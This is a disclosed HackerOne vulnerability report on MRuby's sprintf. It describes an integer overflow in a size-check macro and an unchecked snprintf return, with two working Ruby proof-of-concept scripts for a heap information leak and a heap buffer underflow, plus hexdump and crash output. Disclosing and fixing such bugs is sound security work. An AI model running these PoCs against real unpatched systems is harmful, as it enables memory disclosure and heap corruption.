# sprintf combined format string attack

## Report Details
- **Report ID**: 212241
- **URL**: https://hackerone.com/reports/212241
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-10T11:48:41.167Z
- **Disclosed**: 2017-09-22T00:05:00.297Z

## Reporter
- **Username**: aerodudrizzt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
In a ticket that was also reported to "shopify-scripts" regarding "MRuby", I reported in details a combined attack against the sprintf gem:
* Information leak
* Heap buffer underflow

The full ticket details can be found in:
* Ticket #212239
* The ticked was opened several minutes ago (but I add it in case it will be handled fast enough to be available to you too), and here are the details:

This ticket is somehow connected to Ticket #211190, that suggested another fix to the ```CHECK(l)``` macro. The attached code assumed that the ticket will be fixed like it was fixed in MRuby, however the vulnerabilities apply even without the fix, that was aimed at another vulnerability.

Technical Error 1:
==============
The ```CHECK(l)``` macro can sometimes receive negative values, that will bypass the size checks, since the resize loop is:
```cpp
#define CHECK(l) do {\
/*  int cr = ENC_CODERANGE(result);*/\
  while ((l) >= bsiz - blen) {\
    bsiz*=2;\
  }\
  mrb_str_resize(mrb, result, bsiz);\
/*  ENC_CODERANGE_SET(result, cr);*/\
  buf = RSTRING_PTR(result);\
} while (0)
```
One example for reaching a negative "l" value is in the "G" format when the width is "2 ** 31 - 20", causing need to be ```MIN_INT```:
```cpp
        if ((flags&FWIDTH) && need < width)
            need = width;
        need += 20;

        CHECK(need);
        n = snprintf(&buf[blen], need, fbuf, fval);
        blen += n;
```
Proposed Fix:
--------------------
Since there are several such IOFs, the best fix will be a robust check inside the macro itself.
The macro should add another check to raise an exception in case ```l < 0```.

Technical Error 2:
==============
Still in the "G" format, in case of a huge width, the snprintf call will fail, returning -1:
```cpp
        n = snprintf(&buf[blen], need, fbuf, fval);
        blen += n;
```
This means that we can decrement blen by 1 for each such format primitive.
Information Leak PoC Script:
```ruby
secret_password = "thisismysuperdupersecretpassword"

f = 1234567890.12345678
unique = sprintf("% 2147483628G", f)

sample1 = "1" * 50
sample2 = "2" * 100
sample3 = "3" * 200

print unique.length
print unique
```
On 32bit machines, the ```mrb_str_resize(-1)``` will create a string of length -1 with a data buffer realloced with size 0 (= -1 + 1). The resulting output is:
```
hexdump sprintf_leak.bin
0000000 312d 0000 0000 0000 0000 0000 0000 0000
0000010 0000 0000 0000 0000 0000 0000 0000 0000
*
0000080 0000 0000 0000 0039 0000 3131 3131 3131
0000090 3131 3131 3131 3131 3131 3131 3131 3131
*
00000b0 3131 3131 3131 3131 3131 3131 0000 0071
00000c0 0000 3232 3232 3232 3232 3232 3232 3232
00000d0 3232 3232 3232 3232 3232 3232 3232 3232
*
0000120 3232 3232 3232 0000 0000 0000 0000 00d1
0000130 0000 3333 3333 3333 3333 3333 3333 3333
0000140 3333 3333 3333 3333 3333 3333 3333 3333
*
00001f0 3333 3333 3333 3333 3333 0000 0000 05c9
0000200 0000 ca20 b76f ca20 b76f ebd8 095d ebd8
0000210 095d 0000 0000 0000 0000 0000 0000 0000
0000220 0000 0000 0000 0000 0000 0000 0000 0000
*
00007c0 0000 05c8 0000 0010 0000 001b 0000 0001
00007d0 0000 e048 095d 0029 0000 6874 7369 7369
00007e0 796d 7573 6570 6472 7075 7265 6573 7263
00007f0 7465 6170 7373 6f77 6472 0000 0000 0021
0000800 0000 0810 0000 e2c0 0959 0000 0000 0020
0000810 0000 e0f0 095d f200 095d 0000 0000 0029
0000820 0000 6874 7369 7369 796d 7573 6570 6472
0000830 7075 7265 6573 7263 7465 6170 7373 6f77
0000840 6472 0000 0000 0019 0000 2025 3132 3734
0000850 3834 3633 3832 0047 0000 0000 0000 0021
0000860 0000 0810 0000 e2c0 0959 0000 0000 000d
0000870 0000 e108 095d f260 095d 0000 0000 0019
0000880 0000 2025 3132 3734 3834 3633 3832 0047
0000890 0000 0000 0000 0021 0000 8010 0001 e2c0
00008a0 0959 0000 0000 0031 0000 0000 0000 0000
00008b0 0000 0000 0000 0021 0000 8010 0001 e2c0
00008c0 0959 0000 0000 0032 0000 0000 0000 0000
00008d0 0000 0000 0000 0021 0000 8010 0001 e2c0
00008e0 0959 0000 0000 0033 0000 0000 0000 0000
00008f0 0000 0000 0000 dd31 0001 0000 0000 0000
0000900 0000 0000 0000 0000 0000 0000 0000 0000
*
0001000
```
And a close look will tell us that:
* The print of unique.length returned -1: 0x2d, 0x31
*  Our "secret password" can be found at the last memory block of the dump.

Heap buffer underflow PoC Script:
--------------------------------------------------
```ruby
f = 1234567890.12345678
format = "% 2147483628G" * 10 + "!!!!!!!!!!!"

str1 = "1" * 120
unique = sprintf(format, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f, f)
print str1
```
Decrementing ```blen``` 10 times, will result in a buffer underflow of 10 bytes, that will write '!' on the str1, as can be seen in the dump:
```
*** Error in `./mruby': double free or corruption (out): 0x09905b30 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67257)[0xb7530257]
/lib/i386-linux-gnu/libc.so.6(+0x6d577)[0xb7536577]
/lib/i386-linux-gnu/libc.so.6(+0x6dd31)[0xb7536d31]
./mruby[0x804c81b]
./mruby[0x80593f5]
./mruby[0x8052760]
./mruby[0x805a3a0]
./mruby[0x80596bb]
./mruby[0x80596f8]
./mruby[0x804ce4d]
./mruby[0x8049762]
./mruby[0x8049c48]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb74e1637]
./mruby[0x80491d1]
======= Memory map: ========
08048000-080ed000 r-xp 00000000 08:01 2883651    /XXX/mruby/bin/mruby
080ed000-080ee000 r--p 000a4000 08:01 2883651   /XXX/mruby/bin/mruby
080ee000-080ef000 rw-p 000a5000 08:01 2883651   /XXX/mruby/bin/mruby
098c0000-09924000 rw-p 00000000 00:00 0          [heap]
b7300000-b7321000 rw-p 00000000 00:00 0 
b7321000-b7400000 ---p 00000000 00:00 0 
b7495000-b74b1000 r-xp 00000000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1
b74b1000-b74b2000 rw-p 0001b000 08:01 656726     /lib/i386-linux-gnu/libgcc_s.so.1
b74c8000-b74c9000 rw-p 00000000 00:00 0 
b74c9000-b7678000 r-xp 00000000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so
b7678000-b7679000 ---p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so
b7679000-b767b000 r--p 001af000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so
b767b000-b767c000 rw-p 001b1000 08:01 656688     /lib/i386-linux-gnu/libc-2.23.so
b767c000-b767f000 rw-p 00000000 00:00 0 
b767f000-b76d2000 r-xp 00000000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so
b76d2000-b76d3000 r--p 00052000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so
b76d3000-b76d4000 rw-p 00053000 08:01 656758     /lib/i386-linux-gnu/libm-2.23.so
b76e9000-b76ec000 rw-p 00000000 00:00 0 
b76ec000-b76ee000 r--p 00000000 00:00 0          [vvar]
b76ee000-b76ef000 r-xp 00000000 00:00 0          [vdso]
b76ef000-b7711000 r-xp 00000000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so
b7711000-b7712000 rw-p 00000000 00:00 0 
b7712000-b7713000 r--p 00022000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so
b7713000-b7714000 rw-p 00023000 08:01 656660     /lib/i386-linux-gnu/ld-2.23.so
bff43000-bff64000 rw-p 00000000 00:00 0          [stack]
1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111!!Aborted (core dumped)
```
Proposed Fix:
--------------------
Should check the return value of ```snprintf ``` for errors, instead of directly using it by adding it to ```blen```.

## Attachments
No attachments
